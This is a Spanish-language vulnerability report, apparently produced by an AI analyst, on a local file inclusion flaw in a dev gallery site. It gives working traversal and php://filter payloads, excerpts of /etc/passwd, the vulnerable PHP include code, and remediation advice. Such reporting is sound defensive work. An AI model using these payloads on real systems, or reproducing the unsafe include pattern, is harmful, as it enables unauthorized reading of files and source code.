# Informe de análisis LFI — galería web

Objetivo: http://web.dev.local:8081
Fecha (UTC): 2026-04-18T20:28:19Z
Analista: gpt5mini

Resumen ejecutivo

Se detectó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" del endpoint /gallery.php. Fue posible leer archivos arbitrarios del sistema y recuperar código fuente PHP.

Detalles técnicos

- Endpoint vulnerable: /gallery.php?page=
- Parámetros probados y resultados:
  - ../../../../etc/passwd -> Contenido de /etc/passwd (lectura exitosa).
  - php://filter/convert.base64-encode/resource=gallery.php -> respuesta que incluye el código fuente de gallery.php (lectura de fuente PHP exitosa).
  - /etc/passwd (sin traversal) -> respuesta: "pages//etc/passwd.php" (manejo diferente cuando se concatena path).

Evidencia (extractos)

- /etc/passwd (extracto):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- Inicio de gallery.php (extracto de código fuente recuperado):
  <?php
  $page = $_GET['page'] ?? 'modern';
  ?>
  <!-- HTML ... -->
  <?php
  // Check if the page parameter contains file extension
  if (strpos($page, '.') !== false) {
      $file = $page;
  } else {
      $file = "pages/" . $page . ".php";
  }
  if (file_exists($file)) {
      include($file);
  } else {
      echo "<div class='error'>";
      echo "<h3>Página no encontrada</h3>";
      echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
      echo "</div>";
      @include($file);
  }
  ?>

Impacto

- Lectura de archivos sensibles del sistema (ej. /etc/passwd). Dependiendo de permisos, podría exponerse información sobre usuarios, configuraciones o credenciales.
- Recuperación de código fuente PHP permite descubrir credenciales embebidas, rutas, o lógica vulnerable adicional.
- Combinado con otras debilidades (subidas de archivos, writeable dirs) podría llevar a ejecución remota.

Reproducción (resumen de pasos)

1. Visitar: http://web.dev.local:8081/gallery.php?page=modern (normal)
2. Probar traversal: http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd -> obtener /etc/passwd
3. Leer código fuente: http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php (respuesta conteniendo fuente)

Recomendaciones

1. Nunca incluir directamente rutas controladas por el usuario. Implementar una lista blanca de páginas permitidas (e.g., 'modern','classic','abstract','about').
2. Normalizar y validar la entrada: usar basename(), realpath() y comprobar que el archivo resultante esté dentro de un directorio permitido.
3. Evitar funciones peligrosas y deshabilitar allow_url_include si no es necesario. Habilitar open_basedir para restringir accesos a disco.
4. Evitar mostrar errores o incluir @include silencioso que pueda enmascarar comportamiento. Registrar internamente los intentos.
5. Revisar permisos de archivos y retirar cualquier credencial hard-coded del código fuente.

Estado

Vulnerabilidad encontrada y explotada: Sí
Archivos entregados: este informe

Fin del informe.
